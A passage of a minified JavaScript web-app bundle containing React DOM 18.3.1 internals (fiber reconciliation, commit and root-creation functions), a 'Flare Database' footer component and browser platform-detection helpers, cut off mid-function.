                                    !(w.flags & 65536) && (w.flags |= 256), gv(w, s, a, o, t), Im(cs(l, a));
                                    break e
                                }
                            }
                            o = l = cs(l, a),
                            Ke !== 4 && (Ke = 2),
                            Sa === null ? Sa = [o] : Sa.push(o),
                            o = s;do {
                                switch (o.tag) {
                                    case 3:
                                        o.flags |= 65536, t &= -t, o.lanes |= t;
                                        var m = Zw(o, l, t);
                                        lv(o, m);
                                        break e;
                                    case 1:
                                        a = l;
                                        var g = o.type,
                                            y = o.stateNode;
                                        if (!(o.flags & 128) && (typeof g.getDerivedStateFromError == "function" || y !== null && typeof y.componentDidCatch == "function" && (Yr === null || !Yr.has(y)))) {
                                            o.flags |= 65536, t &= -t, o.lanes |= t;
                                            var x = Yw(o, a, t);
                                            lv(o, x);
                                            break e
                                        }
                                }
                                o = o.return
                            } while (o !== null)
                        }
                        gb(n)
                    } catch (E) {
                        t = E, Ve === n && n !== null && (Ve = n = n.return);
                        continue
                    }
                    break
                } while (!0)
            }

            function pb() {
                var e = iu.current;
                return iu.current = ru, e === null ? ru : e
            }

            function Qm() {
                (Ke === 0 || Ke === 3 || Ke === 2) && (Ke = 4), et === null || !(Xi & 268435455) && !(Ed & 268435455) || Dr(et, it)
            }

            function au(e, t) {
                var n = me;
                me |= 2;
                var r = pb();
                (et !== e || it !== t) && (sr = null, $i(e, t));
                do try {
                    ZS();
                    break
                } catch (i) {
                    hb(e, i)
                }
                while (!0);
                if (Pm(), me = n, iu.current = r, Ve !== null) throw Error(H(261));
                return et = null, it = 0, Ke
            }

            function ZS() {
                for (; Ve !== null;) mb(Ve)
            }

            function YS() {
                for (; Ve !== null && !E_();) mb(Ve)
            }

            function mb(e) {
                var t = yb(e.alternate, e, Ut);
                e.memoizedProps = e.pendingProps, t === null ? gb(e) : Ve = t, zm.current = null
            }

            function gb(e) {
                var t = e;
                do {
                    var n = t.alternate;
                    if (e = t.return, t.flags & 32768) {
                        if (n = GS(n, t), n !== null) {
                            n.flags &= 32767, Ve = n;
                            return
                        }
                        if (e !== null) e.flags |= 32768, e.subtreeFlags = 0, e.deletions = null;
                        else {
                            Ke = 6, Ve = null;
                            return
                        }
                    } else if (n = zS(n, t, Ut), n !== null) {
                        Ve = n;
                        return
                    }
                    if (t = t.sibling, t !== null) {
                        Ve = t;
                        return
                    }
                    Ve = t = e
                } while (t !== null);
                Ke === 0 && (Ke = 5)
            }

            function Ai(e, t, n) {
                var r = xe,
                    i = fn.transition;
                try {
                    fn.transition = null, xe = 1, JS(e, t, n, r)
                } finally {
                    fn.transition = i, xe = r
                }
                return null
            }

            function JS(e, t, n, r) {
                do Yo(); while (Ur !== null);
                if (me & 6) throw Error(H(327));
                n = e.finishedWork;
                var i = e.finishedLanes;
                if (n === null) return null;
                if (e.finishedWork = null, e.finishedLanes = 0, n === e.current) throw Error(H(177));
                e.callbackNode = null, e.callbackPriority = 0;
                var o = n.lanes | n.childLanes;
                if (N_(e, o), e === et && (Ve = et = null, it = 0), !(n.subtreeFlags & 2064) && !(n.flags & 2064) || uc || (uc = !0, wb(Uc, function() {
                        return Yo(), null
                    })), o = (n.flags & 15990) !== 0, n.subtreeFlags & 15990 || o) {
                    o = fn.transition, fn.transition = null;
                    var s = xe;
                    xe = 1;
                    var a = me;
                    me |= 4, zm.current = null, WS(e, n), ub(n, e), yS(jh), Gc = !!Dh, jh = Dh = null, e.current = n, qS(n), A_(), me = a, xe = s, fn.transition = o
                } else e.current = n;
                if (uc && (uc = !1, Ur = e, su = i), o = e.pendingLanes, o === 0 && (Yr = null), k_(n.stateNode), jt(e, $e()), t !== null)
                    for (r = e.onRecoverableError, n = 0; n < t.length; n++) i = t[n], r(i.value, {
                        componentStack: i.stack,
                        digest: i.digest
                    });
                if (ou) throw ou = !1, e = op, op = null, e;
                return su & 1 && e.tag !== 0 && Yo(), o = e.pendingLanes, o & 1 ? e === sp ? ka++ : (ka = 0, sp = e) : ka = 0, pi(), null
            }

            function Yo() {
                if (Ur !== null) {
                    var e = Z1(su),
                        t = fn.transition,
                        n = xe;
                    try {
                        if (fn.transition = null, xe = 16 > e ? 16 : e, Ur === null) var r = !1;
                        else {
                            if (e = Ur, Ur = null, su = 0, me & 6) throw Error(H(331));
                            var i = me;
                            for (me |= 4, W = e.current; W !== null;) {
                                var o = W,
                                    s = o.child;
                                if (W.flags & 16) {
                                    var a = o.deletions;
                                    if (a !== null) {
                                        for (var l = 0; l < a.length; l++) {
                                            var u = a[l];
                                            for (W = u; W !== null;) {
                                                var c = W;
                                                switch (c.tag) {
                                                    case 0:
                                                    case 11:
                                                    case 15:
                                                        _a(8, c, o)
                                                }
                                                var d = c.child;
                                                if (d !== null) d.return = c, W = d;
                                                else
                                                    for (; W !== null;) {
                                                        c = W;
                                                        var f = c.sibling,
                                                            h = c.return;
                                                        if (ab(c), c === u) {
                                                            W = null;
                                                            break
                                                        }
                                                        if (f !== null) {
                                                            f.return = h, W = f;
                                                            break
                                                        }
                                                        W = h
                                                    }
                                            }
                                        }
                                        var v = o.alternate;
                                        if (v !== null) {
                                            var p = v.child;
                                            if (p !== null) {
                                                v.child = null;
                                                do {
                                                    var w = p.sibling;
                                                    p.sibling = null, p = w
                                                } while (p !== null)
                                            }
                                        }
                                        W = o
                                    }
                                }
                                if (o.subtreeFlags & 2064 && s !== null) s.return = o, W = s;
                                else e: for (; W !== null;) {
                                    if (o = W, o.flags & 2048) switch (o.tag) {
                                        case 0:
                                        case 11:
                                        case 15:
                                            _a(9, o, o.return)
                                    }
                                    var m = o.sibling;
                                    if (m !== null) {
                                        m.return = o.return, W = m;
                                        break e
                                    }
                                    W = o.return
                                }
                            }
                            var g = e.current;
                            for (W = g; W !== null;) {
                                s = W;
                                var y = s.child;
                                if (s.subtreeFlags & 2064 && y !== null) y.return = s, W = y;
                                else e: for (s = g; W !== null;) {
                                    if (a = W, a.flags & 2048) try {
                                        switch (a.tag) {
                                            case 0:
                                            case 11:
                                            case 15:
                                                xd(9, a)
                                        }
                                    } catch (E) {
                                        De(a, a.return, E)
                                    }
                                    if (a === s) {
                                        W = null;
                                        break e
                                    }
                                    var x = a.sibling;
                                    if (x !== null) {
                                        x.return = a.return, W = x;
                                        break e
                                    }
                                    W = a.return
                                }
                            }
                            if (me = i, pi(), Un && typeof Un.onPostCommitFiberRoot == "function") try {
                                Un.onPostCommitFiberRoot(hd, e)
                            } catch {}
                            r = !0
                        }
                        return r
                    } finally {
                        xe = n, fn.transition = t
                    }
                }
                return !1
            }

            function Cv(e, t, n) {
                t = cs(n, t), t = Zw(e, t, 1), e = Zr(e, t, 1), t = xt(), e !== null && (Cl(e, 1, t), jt(e, t))
            }

            function De(e, t, n) {
                if (e.tag === 3) Cv(e, e, n);
                else
                    for (; t !== null;) {
                        if (t.tag === 3) {
                            Cv(t, e, n);
                            break
                        } else if (t.tag === 1) {
                            var r = t.stateNode;
                            if (typeof t.type.getDerivedStateFromError == "function" || typeof r.componentDidCatch == "function" && (Yr === null || !Yr.has(r))) {
                                e = cs(n, e), e = Yw(t, e, 1), t = Zr(t, e, 1), e = xt(), t !== null && (Cl(t, 1, e), jt(t, e));
                                break
                            }
                        }
                        t = t.return
                    }
            }

            function XS(e, t, n) {
                var r = e.pingCache;
                r !== null && r.delete(t), t = xt(), e.pingedLanes |= e.suspendedLanes & n, et === e && (it & n) === n && (Ke === 4 || Ke === 3 && (it & 130023424) === it && 500 > $e() - Vm ? $i(e, 0) : Gm |= n), jt(e, t)
            }

            function vb(e, t) {
                t === 0 && (e.mode & 1 ? (t = ec, ec <<= 1, !(ec & 130023424) && (ec = 4194304)) : t = 1);
                var n = xt();
                e = br(e, t), e !== null && (Cl(e, t, n), jt(e, n))
            }

            function ek(e) {
                var t = e.memoizedState,
                    n = 0;
                t !== null && (n = t.retryLane), vb(e, n)
            }

            function tk(e, t) {
                var n = 0;
                switch (e.tag) {
                    case 13:
                        var r = e.stateNode,
                            i = e.memoizedState;
                        i !== null && (n = i.retryLane);
                        break;
                    case 19:
                        r = e.stateNode;
                        break;
                    default:
                        throw Error(H(314))
                }
                r !== null && r.delete(t), vb(e, n)
            }
            var yb;
            yb = function(e, t, n) {
                if (e !== null)
                    if (e.memoizedProps !== t.pendingProps || Ft.current) Mt = !0;
                    else {
                        if (!(e.lanes & n) && !(t.flags & 128)) return Mt = !1, US(e, t, n);
                        Mt = !!(e.flags & 131072)
                    }
                else Mt = !1, Be && t.flags & 1048576 && Ew(t, Yc, t.index);
                switch (t.lanes = 0, t.tag) {
                    case 2:
                        var r = t.type;
                        kc(e, t), e = t.pendingProps;
                        var i = os(t, pt.current);
                        Zo(t, n), i = Dm(null, t, r, e, i, n);
                        var o = jm();
                        return t.flags |= 1, typeof i == "object" && i !== null && typeof i.render == "function" && i.$$typeof === void 0 ? (t.tag = 1, t.memoizedState = null, t.updateQueue = null, Dt(r) ? (o = !0, Kc(t)) : o = !1, t.memoizedState = i.state !== null && i.state !== void 0 ? i.state : null, Bm(t), i.updater = bd, t.stateNode = i, i._reactInternals = t, Qh(t, r, e, n), t = Yh(null, t, r, !0, o, n)) : (t.tag = 0, Be && o && km(t), vt(null, t, i, n), t = t.child), t;
                    case 16:
                        r = t.elementType;
                        e: {
                            switch (kc(e, t), e = t.pendingProps, i = r._init, r = i(r._payload), t.type = r, i = t.tag = rk(r), e = vn(r, e), i) {
                                case 0:
                                    t = Zh(null, t, r, e, n);
                                    break e;
                                case 1:
                                    t = wv(null, t, r, e, n);
                                    break e;
                                case 11:
                                    t = vv(null, t, r, e, n);
                                    break e;
                                case 14:
                                    t = yv(null, t, r, vn(r.type, e), n);
                                    break e
                            }
                            throw Error(H(306, r, ""))
                        }
                        return t;
                    case 0:
                        return r = t.type, i = t.pendingProps, i = t.elementType === r ? i : vn(r, i), Zh(e, t, r, i, n);
                    case 1:
                        return r = t.type, i = t.pendingProps, i = t.elementType === r ? i : vn(r, i), wv(e, t, r, i, n);
                    case 3:
                        e: {
                            if (tb(t), e === null) throw Error(H(387));r = t.pendingProps,
                            o = t.memoizedState,
                            i = o.element,
                            Iw(e, t),
                            eu(t, r, null, n);
                            var s = t.memoizedState;
                            if (r = s.element, o.isDehydrated)
                                if (o = {
                                        element: r,
                                        isDehydrated: !1,
                                        cache: s.cache,
                                        pendingSuspenseBoundaries: s.pendingSuspenseBoundaries,
                                        transitions: s.transitions
                                    }, t.updateQueue.baseState = o, t.memoizedState = o, t.flags & 256) {
                                    i = cs(Error(H(423)), t), t = bv(e, t, r, n, i);
                                    break e
                                } else if (r !== i) {
                                i = cs(Error(H(424)), t), t = bv(e, t, r, n, i);
                                break e
                            } else
                                for (Gt = Kr(t.stateNode.containerInfo.firstChild), Vt = t, Be = !0, bn = null, n = kw(t, null, r, n), t.child = n; n;) n.flags = n.flags & -3 | 4096, n = n.sibling;
                            else {
                                if (ss(), r === i) {
                                    t = xr(e, t, n);
                                    break e
                                }
                                vt(e, t, r, n)
                            }
                            t = t.child
                        }
                        return t;
                    case 5:
                        return Cw(t), e === null && Vh(t), r = t.type, i = t.pendingProps, o = e !== null ? e.memoizedProps : null, s = i.children, Hh(r, i) ? s = null : o !== null && Hh(r, o) && (t.flags |= 32), eb(e, t), vt(e, t, s, n), t.child;
                    case 6:
                        return e === null && Vh(t), null;
                    case 13:
                        return nb(e, t, n);
                    case 4:
                        return Mm(t, t.stateNode.containerInfo), r = t.pendingProps, e === null ? t.child = as(t, null, r, n) : vt(e, t, r, n), t.child;
                    case 11:
                        return r = t.type, i = t.pendingProps, i = t.elementType === r ? i : vn(r, i), vv(e, t, r, i, n);
                    case 7:
                        return vt(e, t, t.pendingProps, n), t.child;
                    case 8:
                        return vt(e, t, t.pendingProps.children, n), t.child;
                    case 12:
                        return vt(e, t, t.pendingProps.children, n), t.child;
                    case 10:
                        e: {
                            if (r = t.type._context, i = t.pendingProps, o = t.memoizedProps, s = i.value, Te(Jc, r._currentValue), r._currentValue = s, o !== null)
                                if (Tn(o.value, s)) {
                                    if (o.children === i.children && !Ft.current) {
                                        t = xr(e, t, n);
                                        break e
                                    }
                                } else
                                    for (o = t.child, o !== null && (o.return = t); o !== null;) {
                                        var a = o.dependencies;
                                        if (a !== null) {
                                            s = o.child;
                                            for (var l = a.firstContext; l !== null;) {
                                                if (l.context === r) {
                                                    if (o.tag === 1) {
                                                        l = mr(-1, n & -n), l.tag = 2;
                                                        var u = o.updateQueue;
                                                        if (u !== null) {
                                                            u = u.shared;
                                                            var c = u.pending;
                                                            c === null ? l.next = l : (l.next = c.next, c.next = l), u.pending = l
                                                        }
                                                    }
                                                    o.lanes |= n, l = o.alternate, l !== null && (l.lanes |= n), Wh(o.return, n, t), a.lanes |= n;
                                                    break
                                                }
                                                l = l.next
                                            }
                                        } else if (o.tag === 10) s = o.type === t.type ? null : o.child;
                                        else if (o.tag === 18) {
                                            if (s = o.return, s === null) throw Error(H(341));
                                            s.lanes |= n, a = s.alternate, a !== null && (a.lanes |= n), Wh(s, n, t), s = o.sibling
                                        } else s = o.child;
                                        if (s !== null) s.return = o;
                                        else
                                            for (s = o; s !== null;) {
                                                if (s === t) {
                                                    s = null;
                                                    break
                                                }
                                                if (o = s.sibling, o !== null) {
                                                    o.return = s.return, s = o;
                                                    break
                                                }
                                                s = s.return
                                            }
                                        o = s
                                    }
                            vt(e, t, i.children, n),
                            t = t.child
                        }
                        return t;
                    case 9:
                        return i = t.type, r = t.pendingProps.children, Zo(t, n), i = hn(i), r = r(i), t.flags |= 1, vt(e, t, r, n), t.child;
                    case 14:
                        return r = t.type, i = vn(r, t.pendingProps), i = vn(r.type, i), yv(e, t, r, i, n);
                    case 15:
                        return Jw(e, t, t.type, t.pendingProps, n);
                    case 17:
                        return r = t.type, i = t.pendingProps, i = t.elementType === r ? i : vn(r, i), kc(e, t), t.tag = 1, Dt(r) ? (e = !0, Kc(t)) : e = !1, Zo(t, n), Kw(t, r, i), Qh(t, r, i, n), Yh(null, t, r, !0, e, n);
                    case 19:
                        return rb(e, t, n);
                    case 22:
                        return Xw(e, t, n)
                }
                throw Error(H(156, t.tag))
            };

            function wb(e, t) {
                return W1(e, t)
            }

            function nk(e, t, n, r) {
                this.tag = e, this.key = n, this.sibling = this.child = this.return = this.stateNode = this.type = this.elementType = null, this.index = 0, this.ref = null, this.pendingProps = t, this.dependencies = this.memoizedState = this.updateQueue = this.memoizedProps = null, this.mode = r, this.subtreeFlags = this.flags = 0, this.deletions = null, this.childLanes = this.lanes = 0, this.alternate = null
            }

            function un(e, t, n, r) {
                return new nk(e, t, n, r)
            }

            function Km(e) {
                return e = e.prototype, !(!e || !e.isReactComponent)
            }

            function rk(e) {
                if (typeof e == "function") return Km(e) ? 1 : 0;
                if (e != null) {
                    if (e = e.$$typeof, e === pm) return 11;
                    if (e === mm) return 14
                }
                return 2
            }

            function Xr(e, t) {
                var n = e.alternate;
                return n === null ? (n = un(e.tag, t, e.key, e.mode), n.elementType = e.elementType, n.type = e.type, n.stateNode = e.stateNode, n.alternate = e, e.alternate = n) : (n.pendingProps = t, n.type = e.type, n.flags = 0, n.subtreeFlags = 0, n.deletions = null), n.flags = e.flags & 14680064, n.childLanes = e.childLanes, n.lanes = e.lanes, n.child = e.child, n.memoizedProps = e.memoizedProps, n.memoizedState = e.memoizedState, n.updateQueue = e.updateQueue, t = e.dependencies, n.dependencies = t === null ? null : {
                    lanes: t.lanes,
                    firstContext: t.firstContext
                }, n.sibling = e.sibling, n.index = e.index, n.ref = e.ref, n
            }

            function Cc(e, t, n, r, i, o) {
                var s = 2;
                if (r = e, typeof e == "function") Km(e) && (s = 1);
                else if (typeof e == "string") s = 5;
                else e: switch (e) {
                    case Bo:
                        return Ui(n.children, i, o, t);
                    case hm:
                        s = 8, i |= 8;
                        break;
                    case yh:
                        return e = un(12, n, t, i | 2), e.elementType = yh, e.lanes = o, e;
                    case wh:
                        return e = un(13, n, t, i), e.elementType = wh, e.lanes = o, e;
                    case bh:
                        return e = un(19, n, t, i), e.elementType = bh, e.lanes = o, e;
                    case C1:
                        return Ad(n, i, o, t);
                    default:
                        if (typeof e == "object" && e !== null) switch (e.$$typeof) {
                            case T1:
                                s = 10;
                                break e;
                            case I1:
                                s = 9;
                                break e;
                            case pm:
                                s = 11;
                                break e;
                            case mm:
                                s = 14;
                                break e;
                            case Or:
                                s = 16, r = null;
                                break e
                        }
                        throw Error(H(130, e == null ? e : typeof e, ""))
                }
                return t = un(s, n, t, i), t.elementType = e, t.type = r, t.lanes = o, t
            }

            function Ui(e, t, n, r) {
                return e = un(7, e, r, t), e.lanes = n, e
            }

            function Ad(e, t, n, r) {
                return e = un(22, e, r, t), e.elementType = C1, e.lanes = n, e.stateNode = {
                    isHidden: !1
                }, e
            }

            function Df(e, t, n) {
                return e = un(6, e, null, t), e.lanes = n, e
            }

            function jf(e, t, n) {
                return t = un(4, e.children !== null ? e.children : [], e.key, t), t.lanes = n, t.stateNode = {
                    containerInfo: e.containerInfo,
                    pendingChildren: null,
                    implementation: e.implementation
                }, t
            }

            function ik(e, t, n, r, i) {
                this.tag = t, this.containerInfo = e, this.finishedWork = this.pingCache = this.current = this.pendingChildren = null, this.timeoutHandle = -1, this.callbackNode = this.pendingContext = this.context = null, this.callbackPriority = 0, this.eventTimes = wf(0), this.expirationTimes = wf(-1), this.entangledLanes = this.finishedLanes = this.mutableReadLanes = this.expiredLanes = this.pingedLanes = this.suspendedLanes = this.pendingLanes = 0, this.entanglements = wf(0), this.identifierPrefix = r, this.onRecoverableError = i, this.mutableSourceEagerHydrationData = null
            }

            function Zm(e, t, n, r, i, o, s, a, l) {
                return e = new ik(e, t, n, a, l), t === 1 ? (t = 1, o === !0 && (t |= 8)) : t = 0, o = un(3, null, null, t), e.current = o, o.stateNode = e, o.memoizedState = {
                    element: r,
                    isDehydrated: n,
                    cache: null,
                    transitions: null,
                    pendingSuspenseBoundaries: null
                }, Bm(o), e
            }

            function ok(e, t, n) {
                var r = 3 < arguments.length && arguments[3] !== void 0 ? arguments[3] : null;
                return {
                    $$typeof: No,
                    key: r == null ? null : "" + r,
                    children: e,
                    containerInfo: t,
                    implementation: n
                }
            }

            function bb(e) {
                if (!e) return ri;
                e = e._reactInternals;
                e: {
                    if (go(e) !== e || e.tag !== 1) throw Error(H(170));
                    var t = e;do {
                        switch (t.tag) {
                            case 3:
                                t = t.stateNode.context;
                                break e;
                            case 1:
                                if (Dt(t.type)) {
                                    t = t.stateNode.__reactInternalMemoizedMergedChildContext;
                                    break e
                                }
                        }
                        t = t.return
                    } while (t !== null);
                    throw Error(H(171))
                }
                if (e.tag === 1) {
                    var n = e.type;
                    if (Dt(n)) return bw(e, n, t)
                }
                return t
            }

            function xb(e, t, n, r, i, o, s, a, l) {
                return e = Zm(n, r, !0, e, i, o, s, a, l), e.context = bb(null), n = e.current, r = xt(), i = Jr(n), o = mr(r, i), o.callback = t ?? null, Zr(n, o, i), e.current.lanes = i, Cl(e, i, r), jt(e, r), e
            }

            function _d(e, t, n, r) {
                var i = t.current,
                    o = xt(),
                    s = Jr(i);
                return n = bb(n), t.context === null ? t.context = n : t.pendingContext = n, t = mr(o, s), t.payload = {
                    element: e
                }, r = r === void 0 ? null : r, r !== null && (t.callback = r), e = Zr(i, t, s), e !== null && (_n(e, i, s, o), Ac(e, i, s)), s
            }

            function lu(e) {
                if (e = e.current, !e.child) return null;
                switch (e.child.tag) {
                    case 5:
                        return e.child.stateNode;
                    default:
                        return e.child.stateNode
                }
            }

            function Pv(e, t) {
                if (e = e.memoizedState, e !== null && e.dehydrated !== null) {
                    var n = e.retryLane;
                    e.retryLane = n !== 0 && n < t ? n : t
                }
            }

            function Ym(e, t) {
                Pv(e, t), (e = e.alternate) && Pv(e, t)
            }

            function sk() {
                return null
            }
            var Eb = typeof reportError == "function" ? reportError : function(e) {
                console.error(e)
            };

            function Jm(e) {
                this._internalRoot = e
            }
            Sd.prototype.render = Jm.prototype.render = function(e) {
                var t = this._internalRoot;
                if (t === null) throw Error(H(409));
                _d(e, t, null, null)
            };
            Sd.prototype.unmount = Jm.prototype.unmount = function() {
                var e = this._internalRoot;
                if (e !== null) {
                    this._internalRoot = null;
                    var t = e.containerInfo;
                    eo(function() {
                        _d(null, e, null, null)
                    }), t[wr] = null
                }
            };

            function Sd(e) {
                this._internalRoot = e
            }
            Sd.prototype.unstable_scheduleHydration = function(e) {
                if (e) {
                    var t = X1();
                    e = {
                        blockedOn: null,
                        target: e,
                        priority: t
                    };
                    for (var n = 0; n < Fr.length && t !== 0 && t < Fr[n].priority; n++);
                    Fr.splice(n, 0, e), n === 0 && tw(e)
                }
            };

            function Xm(e) {
                return !(!e || e.nodeType !== 1 && e.nodeType !== 9 && e.nodeType !== 11)
            }

            function kd(e) {
                return !(!e || e.nodeType !== 1 && e.nodeType !== 9 && e.nodeType !== 11 && (e.nodeType !== 8 || e.nodeValue !== " react-mount-point-unstable "))
            }

            function Rv() {}

            function ak(e, t, n, r, i) {
                if (i) {
                    if (typeof r == "function") {
                        var o = r;
                        r = function() {
                            var u = lu(s);
                            o.call(u)
                        }
                    }
                    var s = xb(t, r, e, 0, null, !1, !1, "", Rv);
                    return e._reactRootContainer = s, e[wr] = s.current, Ua(e.nodeType === 8 ? e.parentNode : e), eo(), s
                }
                for (; i = e.lastChild;) e.removeChild(i);
                if (typeof r == "function") {
                    var a = r;
                    r = function() {
                        var u = lu(l);
                        a.call(u)
                    }
                }
                var l = Zm(e, 0, !1, null, null, !1, !1, "", Rv);
                return e._reactRootContainer = l, e[wr] = l.current, Ua(e.nodeType === 8 ? e.parentNode : e), eo(function() {
                    _d(t, l, n, r)
                }), l
            }

            function Td(e, t, n, r, i) {
                var o = n._reactRootContainer;
                if (o) {
                    var s = o;
                    if (typeof i == "function") {
                        var a = i;
                        i = function() {
                            var l = lu(s);
                            a.call(l)
                        }
                    }
                    _d(t, s, e, i)
                } else s = ak(n, t, e, i, r);
                return lu(s)
            }
            Y1 = function(e) {
                switch (e.tag) {
                    case 3:
                        var t = e.stateNode;
                        if (t.current.memoizedState.isDehydrated) {
                            var n = ca(t.pendingLanes);
                            n !== 0 && (ym(t, n | 1), jt(t, $e()), !(me & 6) && (us = $e() + 500, pi()))
                        }
                        break;
                    case 13:
                        eo(function() {
                            var r = br(e, 1);
                            if (r !== null) {
                                var i = xt();
                                _n(r, e, 1, i)
                            }
                        }), Ym(e, 1)
                }
            };
            wm = function(e) {
                if (e.tag === 13) {
                    var t = br(e, 134217728);
                    if (t !== null) {
                        var n = xt();
                        _n(t, e, 134217728, n)
                    }
                    Ym(e, 134217728)
                }
            };
            J1 = function(e) {
                if (e.tag === 13) {
                    var t = Jr(e),
                        n = br(e, t);
                    if (n !== null) {
                        var r = xt();
                        _n(n, e, t, r)
                    }
                    Ym(e, t)
                }
            };
            X1 = function() {
                return xe
            };
            ew = function(e, t) {
                var n = xe;
                try {
                    return xe = e, t()
                } finally {
                    xe = n
                }
            };
            Ph = function(e, t, n) {
                switch (t) {
                    case "input":
                        if (Ah(e, n), t = n.name, n.type === "radio" && t != null) {
                            for (n = e; n.parentNode;) n = n.parentNode;
                            for (n = n.querySelectorAll("input[name=" + JSON.stringify("" + t) + '][type="radio"]'), t = 0; t < n.length; t++) {
                                var r = n[t];
                                if (r !== e && r.form === e.form) {
                                    var i = vd(r);
                                    if (!i) throw Error(H(90));
                                    R1(r), Ah(r, i)
                                }
                            }
                        }
                        break;
                    case "textarea":
                        B1(e, n);
                        break;
                    case "select":
                        t = n.value, t != null && Wo(e, !!n.multiple, t, !1)
                }
            };
            H1 = Wm;
            $1 = eo;
            var lk = {
                    usingClientEntryPoint: !1,
                    Events: [Rl, Fo, vd, D1, j1, Wm]
                },
                ea = {
                    findFiberByHostInstance: Ci,
                    bundleType: 0,
                    version: "18.3.1",
                    rendererPackageName: "react-dom"
                },
                ck = {
                    bundleType: ea.bundleType,
                    version: ea.version,
                    rendererPackageName: ea.rendererPackageName,
                    rendererConfig: ea.rendererConfig,
                    overrideHookState: null,
                    overrideHookStateDeletePath: null,
                    overrideHookStateRenamePath: null,
                    overrideProps: null,
                    overridePropsDeletePath: null,
                    overridePropsRenamePath: null,
                    setErrorHandler: null,
                    setSuspenseHandler: null,
                    scheduleUpdate: null,
                    currentDispatcherRef: kr.ReactCurrentDispatcher,
                    findHostInstanceByFiber: function(e) {
                        return e = G1(e), e === null ? null : e.stateNode
                    },
                    findFiberByHostInstance: ea.findFiberByHostInstance || sk,
                    findHostInstancesForRefresh: null,
                    scheduleRefresh: null,
                    scheduleRoot: null,
                    setRefreshHandler: null,
                    getCurrentFiber: null,
                    reconcilerVersion: "18.3.1-next-f1338f8080-20240426"
                };
            if (typeof __REACT_DEVTOOLS_GLOBAL_HOOK__ < "u") {
                var dc = __REACT_DEVTOOLS_GLOBAL_HOOK__;
                if (!dc.isDisabled && dc.supportsFiber) try {
                    hd = dc.inject(ck), Un = dc
                } catch {}
            }
            Jt.__SECRET_INTERNALS_DO_NOT_USE_OR_YOU_WILL_BE_FIRED = lk;
            Jt.createPortal = function(e, t) {
                var n = 2 < arguments.length && arguments[2] !== void 0 ? arguments[2] : null;
                if (!Xm(t)) throw Error(H(200));
                return ok(e, t, null, n)
            };
            Jt.createRoot = function(e, t) {
                if (!Xm(e)) throw Error(H(299));
                var n = !1,
                    r = "",
                    i = Eb;
                return t != null && (t.unstable_strictMode === !0 && (n = !0), t.identifierPrefix !== void 0 && (r = t.identifierPrefix), t.onRecoverableError !== void 0 && (i = t.onRecoverableError)), t = Zm(e, 1, !1, null, null, n, !1, r, i), e[wr] = t.current, Ua(e.nodeType === 8 ? e.parentNode : e), new Jm(t)
            };
            Jt.findDOMNode = function(e) {
                if (e == null) return null;
                if (e.nodeType === 1) return e;
                var t = e._reactInternals;
                if (t === void 0) throw typeof e.render == "function" ? Error(H(188)) : (e = Object.keys(e).join(","), Error(H(268, e)));
                return e = G1(t), e = e === null ? null : e.stateNode, e
            };
            Jt.flushSync = function(e) {
                return eo(e)
            };
            Jt.hydrate = function(e, t, n) {
                if (!kd(t)) throw Error(H(200));
                return Td(null, e, t, !0, n)
            };
            Jt.hydrateRoot = function(e, t, n) {
                if (!Xm(e)) throw Error(H(405));
                var r = n != null && n.hydratedSources || null,
                    i = !1,
                    o = "",
                    s = Eb;
                if (n != null && (n.unstable_strictMode === !0 && (i = !0), n.identifierPrefix !== void 0 && (o = n.identifierPrefix), n.onRecoverableError !== void 0 && (s = n.onRecoverableError)), t = xb(t, null, e, 1, n ?? null, i, !1, o, s), e[wr] = t.current, Ua(e), r)
                    for (e = 0; e < r.length; e++) n = r[e], i = n._getVersion, i = i(n._source), t.mutableSourceEagerHydrationData == null ? t.mutableSourceEagerHydrationData = [n, i] : t.mutableSourceEagerHydrationData.push(n, i);
                return new Sd(t)
            };
            Jt.render = function(e, t, n) {
                if (!kd(t)) throw Error(H(200));
                return Td(null, e, t, !1, n)
            };
            Jt.unmountComponentAtNode = function(e) {
                if (!kd(e)) throw Error(H(40));
                return e._reactRootContainer ? (eo(function() {
                    Td(null, null, e, !1, function() {
                        e._reactRootContainer = null, e[wr] = null
                    })
                }), !0) : !1
            };
            Jt.unstable_batchedUpdates = Wm;
            Jt.unstable_renderSubtreeIntoContainer = function(e, t, n, r) {
                if (!kd(n)) throw Error(H(200));
                if (e == null || e._reactInternals === void 0) throw Error(H(38));
                return Td(e, t, n, !1, r)
            };
            Jt.version = "18.3.1-next-f1338f8080-20240426";

            function Ab() {
                if (!(typeof __REACT_DEVTOOLS_GLOBAL_HOOK__ > "u" || typeof __REACT_DEVTOOLS_GLOBAL_HOOK__.checkDCE != "function")) try {
                    __REACT_DEVTOOLS_GLOBAL_HOOK__.checkDCE(Ab)
                } catch (e) {
                    console.error(e)
                }
            }
            Ab(), A1.exports = Jt;
            var Sn = A1.exports,
                Nv = Sn;
            gh.createRoot = Nv.createRoot, gh.hydrateRoot = Nv.hydrateRoot;
            const uk = () => S.jsx("div", {
                    className: "bg-gradient-to-br from-purple-200 via-pink-200 to-accent/20 p-6 lg:px-12 lg:py-8 text-white",
                    children: S.jsxs("section", {
                        className: "flex flex-col md:flex-row md:justify-between gap-8",
                        children: [S.jsx("a", {
                            href: "#",
                            className: "flex items-center gap-2",
                            children: S.jsx("img", {
                                src: "/flare_white.svg",
                                className: "h-8 w-auto"
                            })
                        }), S.jsx("div", {
                            className: "w-2/3 flex gap-2 items-center justify-end text-sm",
                            children: S.jsxs("p", {
                                children: ["© ", new Date().getFullYear(), " Flare Database."]
                            })
                        })]
                    })
                }),
                _b = typeof document < "u" ? q.useLayoutEffect : () => {};

            function dk(e) {
                const t = b.useRef(null);
                return _b(() => {
                    t.current = e
                }, [e]), b.useCallback((...n) => {
                    const r = t.current;
                    return r == null ? void 0 : r(...n)
                }, [])
            }
            const Bl = e => {
                    var t;
                    return (t = e == null ? void 0 : e.ownerDocument) !== null && t !== void 0 ? t : document
                },
                Ni = e => e && "window" in e && e.window === e ? e : Bl(e).defaultView || window;

            function fk(e) {
                var t;
                return typeof window > "u" || window.navigator == null ? !1 : ((t = window.navigator.userAgentData) === null || t === void 0 ? void 0 : t.brands.some(n => e.test(n.brand))) || e.test(window.navigator.userAgent)
            }

            function hk(e) {
                var t;
                return typeof window < "u" && window.navigator != null ? e.test(((t = window.navigator.userAgentData) === null || t === void 0 ? void 0 : t.platform) || window.navigator.platform) : !1
            }

            function Sb(e) {
                let t = null;
                return () => (t == null && (t = e()), t)
            }
            const pk = Sb(function() {
                    return hk(/^Mac/i)
                }),
                mk = Sb(function() {
                    return fk(/Android/i)
                });

            function gk(e) {
